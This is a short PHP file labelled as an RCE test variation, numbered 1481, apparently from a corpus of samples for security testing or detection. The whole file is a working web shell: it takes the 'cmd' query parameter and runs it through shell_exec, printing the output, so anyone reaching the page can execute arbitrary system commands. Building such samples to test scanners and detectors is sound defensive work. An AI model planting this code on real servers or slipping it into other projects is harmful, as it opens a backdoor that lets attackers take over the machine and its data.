<?php
// RCE test variation #1481
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>